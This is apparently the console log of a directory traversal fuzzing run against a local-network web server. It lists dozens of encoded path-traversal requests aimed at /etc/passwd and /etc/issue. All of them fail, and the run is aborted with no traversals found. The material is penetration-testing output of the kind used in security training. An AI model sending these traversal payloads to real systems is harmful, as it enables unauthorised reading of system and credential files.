[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5cetc0x5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5cetc0x5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5cetc0x5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5cetc0x5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5cetc0x5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5cetc0x5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5cetc0x5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252fetc%252fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252fetc%252fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252fetc%252fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252fetc%252fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252fetc%252fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252fetc%252fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252fetc%252fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252fetc%252fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252fetc%252fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252f..%252fetc%252fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255cetc%255cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255cetc%255cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255cetc%255cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255cetc%255cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255cetc%255cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255cetc%255cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255cetc%255cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255cetc%255cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255cetc%255cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255c..%255cetc%255cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2fetc%c0%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2fetc%c0%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2fetc%c0%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2fetc%c0%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%afetc%c0%afpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%afetc%c0%afissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%afetc%c0%afpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%afetc%c0%afissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%afetc%c0%afissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5cetc%c0%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5cetc%c0%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5cetc%c0%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5cetc%c0%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9cetc%c1%9cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9cetc%c1%9cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9cetc%c1%9cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9cetc%c1%9cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pcetc%c1%pcpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pcetc%c1%pcissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pcetc%c1%pcpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pcetc%c1%pcissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9vetc%c0%9vpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9vetc%c0%9vissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9vetc%c0%9vpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9vetc%c0%9vissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9vetc%c0%9vpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9vetc%c0%9vissue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9v..%c0%9vetc%c0%9vpasswd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9v..%c0%9vetc%c0%9vissue
^C
[+] Total Traversals found: 0
[-] Fuzz testing aborted
[+] Report saved: Reports/192.168.1.5_09-03-2020_22-05.txt

```


